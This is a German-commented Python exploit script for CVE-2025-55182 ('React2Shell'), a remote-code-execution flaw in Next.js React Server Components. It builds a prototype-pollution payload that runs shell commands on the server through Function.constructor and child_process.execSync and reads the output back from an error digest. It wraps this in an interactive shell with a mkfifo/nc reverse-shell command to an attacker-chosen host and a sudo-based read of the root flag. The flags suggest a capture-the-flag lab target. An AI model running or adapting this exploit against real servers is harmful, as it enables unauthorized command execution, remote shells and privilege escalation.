#!/usr/bin/env python3
"""
CVE-2025-55182  —  React2Shell  (Next.js React Server Components RCE)
======================================================================

WIE DER CVE FUNKTIONIERT
─────────────────────────
Next.js 15 führte React Server Components (RSC) ein. Server Actions werden
über einen speziellen Multipart-POST-Request ausgelöst:

    POST /
    Next-Action: <action-id>
    Content-Type: multipart/form-data; boundary=...

    --boundary
    Content-Disposition: form-data; name="0"

    <React Flight Protocol JSON>

Das React Flight Protocol deserialisiert JSON zu Live-JS-Objekten auf dem
Server. Der Trick: Man kann über Prototype-Pollution den internen
`_prefix`-Hook des Flight-Response-Objekts überschreiben.

    "_response": {
        "_prefix":   <BELIEBIGER JS-CODE>,
        "_formData": {"get": "$1:constructor:constructor"},
    }

`_formData.get` zeigt auf `Function.constructor` → damit wird `_prefix`
als String durch `new Function(...)` zu echtem Code evaluiert.
Das passiert server-seitig im Node.js-Prozess von Next.js.

Angriffs-Trick: Der Code wirft absichtlich einen NEXT_REDIRECT-Fehler,
dessen `digest`-Feld den Befehlsoutput enthält.
Next.js gibt diesen digest im HTTP-Response-Body zurück → Exfiltration
ohne eigenen Listener.

ATTACK CHAIN
───────────────────────────────────────────────────────────────────
  HTTP POST  ──►  Next.js Flight Deserializer
                      │
                      ▼
             Prototype Pollution auf _response
                      │
                      ▼
          _prefix wird zu Code evaluiert
           (via Function.constructor)
                      │
                      ▼
      child_process.execSync('<cmd>') läuft als
        derselbe User wie der Node.js-Prozess
                      │
                      ▼
      Ausgabe landet in Error.digest
                      │
                      ▼
  HTTP Response Body enthält {"digest":"<output>"}
                      │
                      ▼
          Wir lesen den Output aus  ✓
═══════════════════════════════════════════════════════════════════
"""

import json
import re
import sys
try:
    import readline  # noqa: F401  (Pfeil-Hoch-History auf Linux/macOS)
except ImportError:
    try:
        import pyreadline3  # noqa: F401  (Windows-Ersatz, optional)
    except ImportError:
        pass  # ohne readline läuft die Shell trotzdem
import requests

# ── Target ──────────────────────────────────────────────────────────────────
TARGET_IP   = "10.114.144.103"
TARGET_PORT = 3000
BASE_URL    = f"http://{TARGET_IP}:{TARGET_PORT}"
BOUNDARY    = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

# ── Payload ──────────────────────────────────────────────────────────────────

def _build_js_prefix(cmd: str) -> str:
    """JS-Snippet das via child_process.execSync den Befehl ausführt
    und die Ausgabe über einen geworfenen NEXT_REDIRECT-Error zurückliefert."""
    # Einfache Anführungszeichen dürfen nicht im Befehl vorkommen
    # (wir sind in einem JS-Single-Quote-String) – wird weiter unten geprüft
    return (
        "var res=process.mainModule.require('child_process')"
        f".execSync('{cmd}',{{'timeout':8000}}).toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});"
    )


def _build_body(cmd: str) -> tuple[dict, bytes]:
    field0 = json.dumps({
        "then":   "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value":  '{"then":"$B1337"}',
        "_response": {
            "_prefix":   _build_js_prefix(cmd),
            "_chunks":   "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }, indent=2)

    headers = {
        "User-Agent":          "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Next-Action":         "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type":        f"multipart/form-data; boundary={BOUNDARY}",
    }
    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{field0}\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f'[]\r\n'
        f"--{BOUNDARY}--\r\n"
    ).encode()
    return headers, body


# ── RCE-Kern ─────────────────────────────────────────────────────────────────

def rce(cmd: str, timeout: int = 15) -> str:
    """Führt einen Shell-Befehl auf dem Zielserver aus und gibt stdout zurück."""
    if "'" in cmd:
        # Einfache Quotes würden den JS-String brechen → durch $'...' oder
        # Hex-Escape ersetzen. Für die Shell hier: Fehler melden.
        return "[!] Fehler: Einfache Anführungszeichen (') im Befehl nicht erlaubt.\n" \
               "    Nutze stattdessen: echo $'...' oder $() Subshell-Tricks."

    headers, body = _build_body(cmd)
    try:
        resp = requests.post(BASE_URL, headers=headers, data=body, timeout=timeout)
    except requests.ConnectionError:
        return f"[!] Verbindung zu {BASE_URL} fehlgeschlagen."
    except requests.Timeout:
        return "[!] Timeout – Befehl hat zu lange gedauert (>8s)."
    except requests.RequestException as exc:
        return f"[!] Request-Fehler: {exc}"

    # digest aus JSON-Body extrahieren
    m = re.search(r'"digest"\s*:\s*"([^"]+)"', resp.text)
    if m:
        # Escaped Newlines entschärfen
        return m.group(1).replace("\\n", "\n").replace("\\t", "\t")

    if resp.status_code == 200 and not resp.text.strip():
        return "(kein Output)"

    return f"[!] Kein digest gefunden. HTTP {resp.status_code}\n{resp.text[:300]}"


# ── Interaktive Pseudo-Shell ──────────────────────────────────────────────────

HELP_TEXT = """
Pseudo-Shell Befehle:
  <beliebiger Shell-Befehl>   → wird auf dem Zielserver ausgeführt
  cd <pfad>                   → simuliertes Verzeichniswechsel (kein echtes CWD!)
  !explain                    → CVE-Erklärung nochmal anzeigen
  !whoami                     → wer sind wir auf dem Server?
  !priv                       → sudo-Rechte prüfen (sudo -l)
  !userflag                   → cat /home/daniel/user.txt
  !rootflag                   → Root-Flag über sudo python3 holen
  !revshell <lhost> <lport>   → mkfifo Reverse Shell senden
  help / ?                    → diese Hilfe
  exit / quit / q             → beenden
"""


def read_root_flag() -> str:
    """Root-Flag über NOPASSWD sudo python3 lesen (zwei Schritte)."""
    py_path_expr = (
        "chr(47)+chr(114)+chr(111)+chr(111)+chr(116)"
        "+chr(47)+chr(114)+chr(111)+chr(111)+chr(116)"
        "+chr(46)+chr(116)+chr(120)+chr(116)"
    )
    py_one = f"f=open({py_path_expr});print(f.read().strip())"
    print("  [*] Schreibe Helper nach /tmp/rce_flag.py …")
    out = rce(f'echo "{py_one}" > /tmp/rce_flag.py')
    if out.startswith("[!]"):
        return out
    print("  [*] Führe sudo python3 aus …")
    return rce("sudo /usr/bin/python3 /tmp/rce_flag.py")


def send_revshell(lhost: str, lport: int) -> None:
    cmd = (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f"
        f"|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )
    h, b = _build_body(cmd)
    try:
        requests.post(BASE_URL, headers=h, data=b, timeout=5)
    except Exception:
        pass  # Verbindung bricht beim Shell-Spawn ab – normal


def print_cve_explanation() -> None:
    print(__doc__)


def run_shell() -> None:
    cwd = "~"   # rein visuell, kein echter State
    print(f"\n  Verbunden mit {BASE_URL}")
    print("  Tippe 'help' für Befehle, 'exit' zum Beenden.\n")

    while True:
        try:
            raw = input(f"\033[32mshell@target\033[0m:\033[34m{cwd}\033[0m$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shell beendet.")
            break

        if not raw:
            continue

        low = raw.lower()

        if low in ("exit", "quit", "q"):
            print("[*] Beendet.")
            break

        if low in ("help", "?"):
            print(HELP_TEXT)
            continue

        if low == "!explain":
            print_cve_explanation()
            continue

        if low == "!whoami":
            print(rce("id && whoami"))
            continue

        if low == "!priv":
            print(rce("sudo -l 2>&1"))
            continue

        if low == "!userflag":
            print(rce("cat /home/daniel/user.txt"))
            continue

        if low == "!rootflag":
            flag = read_root_flag()
            if flag and not flag.startswith("[!]"):
                print(f"\n    ★  ROOT FLAG: {flag}\n")
            else:
                print(f"[-] {flag}")
            continue

        if low.startswith("!revshell"):
            parts = raw.split()
            if len(parts) != 3:
                print("Nutzung: !revshell <lhost> <lport>")
                print("Beispiel: !revshell 10.9.0.1 4444")
                print("Vorher auf deiner Maschine: nc -lvnp 4444")
                continue
            lhost, lport_s = parts[1], parts[2]
            try:
                lport = int(lport_s)
            except ValueError:
                print("[!] Port muss eine Zahl sein.")
                continue
            print(f"[*] Sende Reverse Shell → {lhost}:{lport}")
            print("[!] Stelle sicher, dass dein Listener läuft: nc -lvnp " + lport_s)
            send_revshell(lhost, lport)
            print("[+] Payload gesendet!")
            continue

        # cd simulieren (nur visuell)
        if raw.startswith("cd "):
            path = raw[3:].strip()
            cwd = path if path.startswith("/") else f"{cwd}/{path}".replace("//", "/")
            # Prüfen ob Verzeichnis existiert
            out = rce(f"test -d {cwd} && echo OK || echo NOTFOUND")
            if "NOTFOUND" in out:
                print(f"bash: cd: {cwd}: No such file or directory")
                cwd = "~"
            continue

        # Normaler Befehl
        out = rce(raw)
        if out:
            print(out)


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print("═" * 65)
    print("  CVE-2025-55182  React2Shell  —  Interaktive Exploit-Shell")
    print(f"  Target : {BASE_URL}")
    print("═" * 65)

    print("\n[*] Überprüfe Verbindung und RCE …")
    out = rce("id")
    if out.startswith("[!]"):
        print(out)
        print("[-] Kein RCE erreichbar. IP/Port prüfen.")
        sys.exit(1)

    print(f"[+] RCE bestätigt! Server läuft als: {out}\n")

    if "--explain" in sys.argv:
        print_cve_explanation()
        return

    run_shell()


if __name__ == "__main__":
    main()
